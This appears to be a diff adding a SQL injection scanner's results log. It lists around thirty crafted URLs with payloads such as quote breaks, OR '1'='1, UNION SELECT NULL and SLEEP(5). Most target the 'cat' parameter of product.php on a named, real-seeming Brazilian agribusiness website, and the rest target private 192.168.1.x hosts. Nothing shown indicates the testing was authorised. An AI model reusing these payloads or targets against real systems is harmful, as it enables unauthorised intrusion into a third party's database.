@@ -1,0 +1,30 @@
+[Error-Based] https://www.fistarolagronegocios.com.br/product.php?cat=3%27 | Payload: '
+[Error-Based] https://www.fistarolagronegocios.com.br/product.php?cat=3%22 | Payload: "
+[Error-Based] https://www.fistarolagronegocios.com.br/product.php?cat=3%27+OR+%271%27%3D%271 | Payload: ' OR '1'='1
+[Error-Based] https://www.fistarolagronegocios.com.br/product.php?cat=3%27+AND+1%3D1-- | Payload: ' AND 1=1--
+[Error-Based] https://www.fistarolagronegocios.com.br/product.php?cat=3%27+AND+1%3D2-- | Payload: ' AND 1=2--
+[Error-Based] https://www.fistarolagronegocios.com.br/product.php?cat=3%27+UNION+SELECT+NULL-- | Payload: ' UNION SELECT NULL--
+[Error-Based] https://www.fistarolagronegocios.com.br/product.php?cat=3%27+UNION+SELECT+NULL%2CNULL-- | Payload: ' UNION SELECT NULL,NULL--
+[Error-Based] https://www.fistarolagronegocios.com.br/product.php?cat=3%27+OR+SLEEP%285%29-- | Payload: ' OR SLEEP(5)--
+[Time-Based] http://192.168.1.40:8080/?id=1%27+OR+SLEEP%285%29-- | Payload: ' OR SLEEP(5)--
+[Time-Based] http://192.168.1.40:8080/?id=1%27%2BAND%2BSLEEP%285%29--%2B | Payload: '+AND+SLEEP(5)--+
+[Boolean-Based] http://192.168.1.40:8080/?id=1%27+AND+1%3D1-- | Payload: ' AND 1=1--
+[Time-Based] http://192.168.1.40:8080/?id=1%27+AND+SLEEP%285%29--+ | Payload: ' AND SLEEP(5)-- 
+[Error-Based] https://www.fistarolagronegocios.com.br/product.php?cat=%27 | Payload: '
+[Error-Based] https://www.fistarolagronegocios.com.br/product.php?cat=%22 | Payload: "
+[Error-Based] https://www.fistarolagronegocios.com.br/product.php?cat=%27+OR+%271%27%3D%271 | Payload: ' OR '1'='1
+[Error-Based] https://www.fistarolagronegocios.com.br/product.php?cat=%27+AND+1%3D1-- | Payload: ' AND 1=1--
+[Error-Based] https://www.fistarolagronegocios.com.br/product.php?cat=%27+AND+1%3D2-- | Payload: ' AND 1=2--
+[Error-Based] https://www.fistarolagronegocios.com.br/product.php?cat=%27+UNION+SELECT+NULL-- | Payload: ' UNION SELECT NULL--
+[Error-Based] https://www.fistarolagronegocios.com.br/product.php?cat=%27+UNION+SELECT+NULL%2CNULL-- | Payload: ' UNION SELECT NULL,NULL--
+[Error-Based] https://www.fistarolagronegocios.com.br/product.php?cat=%27+OR+SLEEP%285%29-- | Payload: ' OR SLEEP(5)--
+[Error-Based] https://www.fistarolagronegocios.com.br/product.php?cat=%27+AND+SLEEP%285%29--+ | Payload: ' AND SLEEP(5)-- 
+[Error-Based] http://192.168.1.41:8080/?id=1%27 | Payload: '
+[Error-Based] http://192.168.1.41:8080/?id=1%22 | Payload: "
+[Error-Based] http://192.168.1.41:8080/?id=1%27+OR+%271%27%3D%271 | Payload: ' OR '1'='1
+[Error-Based] http://192.168.1.41:8080/?id=1%27+AND+1%3D1-- | Payload: ' AND 1=1--
+[Error-Based] http://192.168.1.41:8080/?id=1%27+AND+1%3D2-- | Payload: ' AND 1=2--
+[Error-Based] http://192.168.1.41:8080/?id=1%27+UNION+SELECT+NULL-- | Payload: ' UNION SELECT NULL--
+[Error-Based] http://192.168.1.41:8080/?id=1%27+UNION+SELECT+NULL%2CNULL-- | Payload: ' UNION SELECT NULL,NULL--
+[Error-Based] http://192.168.1.41:8080/?id=1%27+OR+SLEEP%285%29-- | Payload: ' OR SLEEP(5)--
+[Error-Based] http://192.168.1.41:8080/?id=1%27+AND+SLEEP%285%29--+ | Payload: ' AND SLEEP(5)-- 
